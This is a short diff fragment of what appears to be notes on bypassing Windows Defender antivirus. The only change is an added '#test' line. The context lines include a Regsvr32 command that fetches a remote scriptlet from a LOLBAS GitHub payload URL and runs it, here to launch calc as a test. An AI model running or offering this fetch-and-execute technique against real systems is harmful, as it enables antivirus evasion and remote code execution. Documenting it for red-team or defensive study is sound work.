@@ -7,3 +7,4 @@ Bypass Defender AV by:
 2. Testing that by launching calc  
 `Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct
 NothingToSeeHere.dll`
+#test
